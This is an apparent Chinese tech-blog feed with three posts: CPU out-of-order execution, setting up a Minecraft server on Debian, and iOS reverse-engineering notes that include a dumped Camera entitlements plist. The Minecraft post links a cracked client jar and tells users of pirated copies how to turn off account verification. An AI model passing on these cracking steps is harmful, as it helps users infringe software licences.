<td style="text-align:center">5. R1=R1+4</td>
</tr>
<tr>
<td style="text-align:center">6. M[2056]=R1</td>
</tr>
</tbody>
</table>
<p>第4、第5、第6条指令在功能上是不依赖于第1、第2、第3条指令的。但是处理器却不能在第3条指令完成前去完成第4条指令（在<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E4%BB%A4%E6%B5%81%E6%B0%B4%E7%BA%BF" target="_blank" rel="external">指令流水线</a>上，不能在第3条指令完成前，就提交第4条指令的结果），因为这可能会导致第3条指令把错误的数据写入内存。</p>
<p>通过改变一些寄存器的名字，可以使上例中指令并行执行所受的限制：</p>
<table>
<thead>
<tr>
<th style="text-align:center">1. R1=M[1024]</th>
<th style="text-align:center">4. R2=M[2048]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">2. R1=R1+2</td>
<td style="text-align:center">5. R2=R2+4</td>
</tr>
<tr>
<td style="text-align:center">3. M[1032]=R1</td>
<td style="text-align:center">6. M[2056]=R2</td>
</tr>
</tbody>
</table>
<p>那么寄存器重命名也就是上例中的R1映射为不同的物理寄存器，从而在硬件上提供了额外的并行能力，编译器会尽力检测出类似这样的问题，并把不同的寄存器分配给不同的指令使用。</p>
<ol>
<li>当微指令翻译完成后，它们会进入一个重排序缓存(Reorder Buffer, ROB)，ROB可以存储最多128条微指令。在支持超线程的处理器上，ROB同样可以重排来自两个虚拟处理器的指令。两个虚拟处理器在ROB中将微指令汇集到一个共享的乱序执行部件中。</li>
<li>接下来乱序执行就真正的开始了，不同的微指令在不同的执行单元中同时执行，而且每个执行单元都全速运行。只要当前微指令所需要的数据就绪，而且有空闲的执行单元，微指令就可以立即执行，有时甚至可以跳过前面还未就绪的微指令。通过这种方式，需要长时间运行的操作不会阻塞后面的操作，流水线阻塞带来的损失被极大的减小了。</li>
<li>最终微指令会得到执行，在经过数个流水级之后，最终会退出流水线。这时，这条指令完成并且递增指令指针。但从程序员的角度来说，指令仅仅是从一端进入CPU，从另一端退出，就像老的8086一样。(就像黑盒一样，黑盒里面的过程对于我们来说是透明的 )</li>
</ol>
<h1 id="猜测执行"><a href="#猜测执行" class="headerlink" title="猜测执行"></a>猜测执行</h1><p>我们会注意到乱序执行对于取指部分做的改变是将跳转指令加入到指令缓存中，那么我们遇到跳转的时候会发生什么呢？对于老式的CPU来说，这可算是<code>生命不可承受之重</code>了，它会清空你的流水线，等待新的跳转目的指令的取指执行。当指令队列中存储了超过100条指令的时候，发生流水线阻塞对于性能损失是极为严重的，所有指令都被阻塞等待跳转目的指令的fetch然后重启流水线，这种情况的频繁发生对于处理器肯定是吃不消的，于是我们需要乱序执行部件的另外一个功能就是猜测执行。</p>
<p>猜测执行意味着当遇到一个分支指令后，乱序执行部件会将所有分支的指令都执行一遍。一旦分支指令的跳转方向确定后，错误跳转方向的指令都将被丢弃。通过同时执行两个跳转方向的指令，避免了由于分支跳转导致的阻塞。处理器设计者还发明了分支预测缓存，当面临多个分支时进行预测，进一步提高了性能。虽然CPU阻塞仍然会发生，但是这个解决方案将CPU发生阻塞的概率降到了一个可以接受的范围。</p>
<p>最后，拥有超线程的处理器将两个虚拟的处理器暴露给共享的乱序执行部件。它们共享一个重排序缓存和乱序执行部件，让操作系统认为它们是两个独立的处理器，看上去就像这样：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-03-01%20%E4%B8%8A%E5%8D%8812.11.18.png" alt="屏幕快照 2018-03-01 上午12.11.18.png" title="" class="">
                <p>屏幕快照 2018-03-01 上午12.11.18.png</p>
            </figure>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>例子参考的是一篇博客上的，觉得说的比较好就转载过来了，文章的地址是<a href="http://blog.jobbole.com/40844/" target="_blank" rel="external">CPU流水线的探索之谜</a>：</p>
<p>这一切看上去有点令人感到困惑，那么我们举一个例子来让这一切变得清晰起来。</p>
<p>从应用程序的角度来看，我们仍然是运行在指令流水线上，就想老的8086处理器那样。处理器就是一个黑盒子。黑盒子会处理指令指针指向的指令，当处理完之后，会在内存里找到处理的结果。</p>
<p>但是从指令本身的角度来讲，这个过程可谓历经沧桑。我们下面介绍对于现今的处理器（大约在2008-2013年之间），一条指令在其内部的过程。</p>
<p>首先，你是一条指令，你所属的程序正在运行。</p>
<p>你一直在耐心的等待指令指针会指向自己，等待被CPU运行。当指令指针距离你还有4KB远的时候（这大约是1500条指令），你被CPU从内存取到指令缓存中。虽然从内存加载进入指令缓存需要一段时间，但是现在距离你被执行的时刻还很远，你有足够的时间。这个预取的过程属于流水线的第一级。</p>
<p>当指令指针离你越来越近，距离你还有24条指令的时候，你和你旁边的5个指令会被放到指令队列里面。</p>
<p>这个处理器有4个译码器，可以容纳一个复杂指令和最多三个简单指令。你碰巧是一条复杂指令，通过译码，你被翻译成4个微指令。</p>
<p>译码的过程可以划分为多步。译码过程中的一步是检查你需要的数据和猜测你可能会产生一个地址跳转。译码器一旦检测到需要的额外数据，不需要让你知道，这个数据就开始从内存加载到数据缓存中了。</p>
<p>你的四个微指令到达寄存器重命名表。你告诉它你需要读哪个内存地址（比如说fs:[eax+18h]），然后寄存器重命名表将这个地址转换为临时地址供微指令使用。地址转化完成后，你的微指令将进入重排序缓存(Reorder Buffer, ROB)并记录指令次序。接着第一时间进入保留站(Reservation Station, RS)。</p>
<p>保留站用于存储已经准备就绪可以执行的指令。你的第三条微指令被立即选中并送往端口5，这个端口直接执行运算。但是你并不知道为什么它会被首先选中，无论如何，它确实被执行了。几个时钟周期之后你的第一条微指令前往端口2，该端口是读单元(Load Address execution unit)。剩余的微指令一直等待，同时各个端口正在收集不同的微指令。他们都在等待端口2将数据从缓存和内存中加载进来并放在临时存储空间内。</p>
<p>他们等了很久……</p>
<p>相当久的时间……</p>
<p>不过在他们等待第一条微指令返回数据的时候，又有其他的新指令又进来。好在处理器知道如何让这些指令乱序执行（即后到达保留站的微指令被优先执行）。</p>
<p>当第一条微指令返回了数据，剩余的两条微指令被立即送往执行端口0和1。现在这4条微指令都已经运行，最终它们会返回保留站。</p>
<p>这些微指令返回后交出他们的“票”并给出各自的临时地址。通过这些地址，你作为一个完整的指令，将他们合并。最后CPU将结果交给你并使你退出</p>
<p>当你到达标有“退出”的门的时候，你会发现这里要排一个队列。你进入后发现你刚好站在你前面进来指令的后面，即使执行中的顺序可能已经不同，但你们退出的顺序继续保持一致。看来乱序执行部件真正知道自己做了什么。</p>
<p>每条指令最终离开CPU，每次一条指令，就和指令指针指向的顺序一样！</p>
]]></content>
      
        
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在Debian上搭建MC服务器]]></title>
      <url>/2018/02/10/%E5%9C%A8Debian%E4%B8%8A%E6%90%AD%E5%BB%BAMC%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%889.27.16.png" height="350" width="600" alt=""></p>
<p>大家都玩过我的世界这个经典的游戏，号称世界上第一款的沙盒游戏，虽然他的画质(呵呵)，但是他的自由度让我们都为之着迷，可以享受到真正作为一个上帝的乐趣，话说我在两年前的暑假还在这个游戏上建造过山车之类的，将世界打造成游乐场(当时还不会任何的技术)，<code>make a real world!</code></p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>直到昨天的时候我突然又不小心看到了这个游戏，于是已经学了一些技术的我自然就想做一些DIY了，不是那种借用第三方的作弊器，that’s too boring。我想要搭建一个多人在线的MC服务器，当自己一个人的神还不够爽，之前看网上的各种花式玩法还是很羡慕的，虽然电脑是Mac的，但是依然不妨碍我们玩游戏的心，那么接下来我们就开始吧，我把整个构成分成几个环节：</p>
<ol>
<li>服务器上安装java环境，jre即可</li>
<li>可以选择性的安装<code>screen</code>(可选)</li>
<li>下载java版MC的服务端，然后跑起来</li>
<li>本地获得对应服务端的客户端，然后连上去</li>
</ol>
<p>整个过程看起来十分的简单，但是其中还有一些问题我在第一次折腾的时候还是会有些蛋疼的，接下来就一步一步的走一波，从服务器端开始，希望没有计算机基础的游戏爱好者也可以学会。</p>
<h1 id="Debian安装java环境"><a href="#Debian安装java环境" class="headerlink" title="Debian安装java环境"></a>Debian安装java环境</h1><p>由于我们的服务器是debian的系统，所以我们介绍的是Debian上的安装方法，当然这种东西最好使用Docker去跑，但是本博主的docker水平停留在学习一天的水平，只能用容器跑个网站，玩这个到时候把我系统网卡都跑崩了就不好了，毕竟docker和K8这玩意太蛋疼，废话不多说，开始安装：</p>
<p>Debian官方没有维护专门的Java软件包，所以不能直接用apt-get工具来安装。在Debian系统中要安装Java，有两种方式，一种是用传统方式，一种是Debian方式。</p>
<p>后面一种方法我们不讲，就说前一种，没装wget的朋友看下面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install wget</div></pre></td></tr></table></figure>
<p>然后我们去官网上找一下我们需要下载的地址，可以直接输<code>sun.com</code>，然后跳转到<code>Oracle</code>的官网，找到java下载所在的页面，然后右键复制下载的地址：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%889.45.03.png" alt="屏幕快照 2018-02-10 下午9.45.03.png" title="" class="">
                <p>屏幕快照 2018-02-10 下午9.45.03.png</p>
            </figure>
<p>在服务器中输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget http://javadl.oracle.com/webapps/download/AutoDL?BundleId=230532_2f38c3b165be4555a1fa6e98c45e0808</div></pre></td></tr></table></figure>
<p>然后获得一个AutoDLxxx的文件，这个文件首先要改个名字，叫做java.tar.gz，直接用<code>mv</code>就好，然后解压：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf java.tar.gz</div></pre></td></tr></table></figure>
<p>出来一个jrexxx的文件夹，接下里就是配置环境变量了，找到.bash_profile（没有则创建一个，在家目录下）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export CLASSPATH=/usr/local/jrexxx/lib</div><div class="line">export JAVA_HOME=/usr/local/jrexxx</div><div class="line">export PATH=$JAVA_HOME/bin:$PATH</div></pre></td></tr></table></figure>
<p>然后就用<code>java -version</code>测试一下了，应该到这里就成功了。</p>
<p>第一步到此搞定，第二部想安装的一个<code>apt-get</code>就搞定。</p>
<h1 id="下载MC服务端"><a href="#下载MC服务端" class="headerlink" title="下载MC服务端"></a>下载MC服务端</h1><p>这一步其实相对来说非常的简单，但是有一点要注意就是你的客户端和服务端必须版本对应，不然是连接不上的，初次之外，还有一些配置文件的修改问题需要注意：</p>
<p>首先就是下载的地址了，同样可以通过wget去下载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://s3.amazonaws.com/Minecraft.Download/versions/1.12.2/minecraft_server.1.12.2.jar</div></pre></td></tr></table></figure>
<p>网址中的<code>1.12.2</code>是我们的版本号，需要和客户端一一对应，下载之后我们要对两个文件进行配置，首先ls看一下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8A%E5%8D%8811.35.00.png" alt="屏幕快照 2018-02-12 上午11.35.00.png" title="" class="">
                <p>屏幕快照 2018-02-12 上午11.35.00.png</p>
            </figure>
<p>一个就是eula.txt这个文件，将其中的值改为true，用来同意eula协议，也就是一个最终用户许可协议</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8A%E5%8D%8811.35.55.png" alt="屏幕快照 2018-02-12 上午11.35.55.png" title="" class="">
                <p>屏幕快照 2018-02-12 上午11.35.55.png</p>
            </figure>
<p>这个修改完成以后下面是一个可选修改项，如果你是买了MC的玩家，可以跳过，如果是crack的玩家，就需要进行这一步，因为在联机的时候，客户端向服务端请求的参数有一个id属性，对于crack的玩家，这个属性值是null，所以在客户端请求的时候，虽然服务器成功开起来，版本号也对应的上，但是会报java空指针的错误，那么这种情况下就需要去修改<code>server.properties</code>这个文件了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">online-mode=false   #是否开启正版验证，需用我的世界官方启动器才能进入</div></pre></td></tr></table></figure>
<p>这个值我们修改为false之后就可以正常的登陆了（其他值的配置参考<a href="https://jingyan.baidu.com/article/8ebacdf074bc0049f75cd550.html" target="_blank" rel="external">百度教程</a>），当然这个是后话，先要把服务器跑起来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#开启一个新窗口运行</div><div class="line">screen -S &quot;mc&quot;</div><div class="line">#开启服务器并限制参数</div><div class="line">java  -Xmx256M -Xms1M -jar mc.jar nogui</div></pre></td></tr></table></figure>
<p>这样我们的服务器端的所有工作就基本搞定了，剩下的DIY工作就是各路玩家做的事情了，还有一个重点当然不能忽视，就是服务端的OP指令，这里当个搬运工吧—<a href="https://tieba.baidu.com/p/2646365811?red_tag=2929703202" target="_blank" rel="external">我的世界常用op指令</a>。</p>
<h1 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h1><p>在windows上的破解手段太多就不说了，在这里就以Mac版的作为例子，首先我们去官网上注册一个账号然后下载游戏，等待游戏下好之后，我们登陆刚刚注册的账号，选择试玩版，进入世界之后退出，然后下载我们的crack工具，同样放在了<a href="ftp://118.89.38.168/pic/test/Minecraft+MAC.jar" target="_blank" rel="external">ftp</a>上：</p>
<p>下载完了之后我们打开这个java，本地的java环境搭建我就不多说了，最后再说一次，注意和服务端的版本好一致，接下来你有一个前提条件就是需要掌握科学上网方式:</p>
<ol>
<li>打开.jar文件，选择OK：</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8B%E5%8D%881.13.22.png" alt="屏幕快照 2018-02-12 下午1.13.22.png" title="" class="">
                <p>屏幕快照 2018-02-12 下午1.13.22.png</p>
            </figure>
<ol>
<li>等待着右下方出现需要你输入用户名的地方，这个username随便输就好，如果你没有掌握科学上网的方式，右下角就会一直卡在<code>Loding versions</code>的地方了：</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8B%E5%8D%881.13.59.png" alt="屏幕快照 2018-02-12 下午1.13.59.png" title="" class="">
                <p>屏幕快照 2018-02-12 下午1.13.59.png</p>
            </figure>
<p>如果科学上网成功出现的username界面如下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8B%E5%8D%881.17.18.png" alt="屏幕快照 2018-02-12 下午1.17.18.png" title="" class="">
                <p>屏幕快照 2018-02-12 下午1.17.18.png</p>
            </figure>
<ol>
<li>第二步成功了之后，就选择合适的profile，选择我的世界版本，然后点击play开始游戏，进度条加载完之后，你就可以进入游戏了，然后就是选择多人游戏，连接到自己搭建的服务器，那么整个过程就大功告成了：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8B%E5%8D%881.18.43.png" alt="屏幕快照 2018-02-12 下午1.18.43.png" title="" class="">
                <p>屏幕快照 2018-02-12 下午1.18.43.png</p>
            </figure></li>
</ol>
<p>连接上去之后就来展示一下我们的op指令吧：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8B%E5%8D%881.31.16.png" alt="屏幕快照 2018-02-12 下午1.31.16.png" title="" class="">
                <p>屏幕快照 2018-02-12 下午1.31.16.png</p>
            </figure>
<p>调整一下游戏时间，来看看，然后调整一下天气:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-12%20%E4%B8%8B%E5%8D%881.33.15.png" alt="屏幕快照 2018-02-12 下午1.33.15.png" title="" class="">
                <p>屏幕快照 2018-02-12 下午1.33.15.png</p>
            </figure>
<p>那么我的世界傻瓜教程就到此结束了，有问题的可以提问哟，回不回复就看缘分了。</p>
]]></content>
      
        <categories>
            
            <category> MC私服 一刀999 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 服务器端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS逆向学习(五)]]></title>
      <url>/2018/02/07/iOS%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E4%BA%94/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-07%20%E4%B8%8B%E5%8D%8811.35.55.png" height="350" width="600" alt=""></p>
<p>这篇博客中主要是杂谈，说到一些在学习中遇到的问题和觉得有用的东西，进行一些总结和分享。</p>
<a id="more"></a>
<h1 id="关于Reveal调试无法显示"><a href="#关于Reveal调试无法显示" class="headerlink" title="关于Reveal调试无法显示"></a>关于Reveal调试无法显示</h1><p>之前在论坛上发了一个帖子说我在注入照相机的时候，调用对应的拍照函数没有被系统日志记录，后来snakeninny大神在下面留言说可能是这个函数并没有被调用，之后我又追问了一番，决定使用Reveal进行分析一下，但是正在外面，用手机开了个热点，然后发现相机怎么也无法显示，当时也没有多想，等会去之后还是这个问题，于是我在系统日志中去寻找了一下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /var/log/syslog | grep Camera</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-07%20%E4%B8%8B%E5%8D%885.16.34.png" alt="屏幕快照 2018-02-07 下午5.16.34.png" title="" class="">
                <p>屏幕快照 2018-02-07 下午5.16.34.png</p>
            </figure>
<p>那么看起来应该是权限问题了，通过报错信息搜索并没有找到答案，后来通过一下搜索技巧在StackOverFlow上找到了一个<a href="https://stackoverflow.com/questions/27126315/cannot-bind-a-socket-inside-apple-calendar-dylib-injection" target="_blank" rel="external">回答</a>，从上面的回答来看遇到了和我一样问题，但他很敏锐的注意到了这个可执行文件的路径下还有一个Entitlements.plist文件，而在其他的包中没有发现。</p>
<p>下面的回答说是因为沙盒机制，除了系统的App，还有很多系统组件也使用着这些沙盒，在那个plist文件中我们可以看到，更加确切的说是从<code>seatbelt-profiles</code>key来看，一开始是二进制plist，我们先转换成xml格式方便观察：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plutil -convert xml1 Entitlements.plist</div></pre></td></tr></table></figure>
<p>下面是转换后的plist文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>CanInheritApplicationStateFromOtherProcesses<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>application-identifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.camera<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>checklessPersistentURLTranslation<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.QuartzCore.global-capture<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.QuartzCore.secure-mode<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.UIKit.vends-view-services<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.accounts.appleaccount.fullaccess<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.avfoundation.allow-still-image-capture-shutter-sound-manipulation<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.coreaudio.allow-amr-decode<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.developer.extension-host.photo-editing<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.excludes-extensions<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.mediastream.mstreamd-access<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.mobile.deleted.AllowFreeSpace<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.photos.bourgeoisie<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.MobileGestalt.AllowedProtectedKeys<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>EthernetMacAddress<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>WifiAddressData<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>WifiAddress<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>UniqueDeviceID<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.accounts.allaccounts<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.allow-explicit-graphics-priority<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.assetsd.nebulad.access<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>camera<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.corerecents<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.imcore.imremoteurlconnection<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.lockdown.finegrained-get<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>NULL/ActivationPrivateKey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>NULL/DeviceCertificate<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.tcc.allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>kTCCServiceMicrophone<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>kTCCServicePhotos<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>kTCCServiceCamera<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.tcc.allow.overridable<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>kTCCServiceAddressBook<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.exception.mach-lookup.global-name<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span 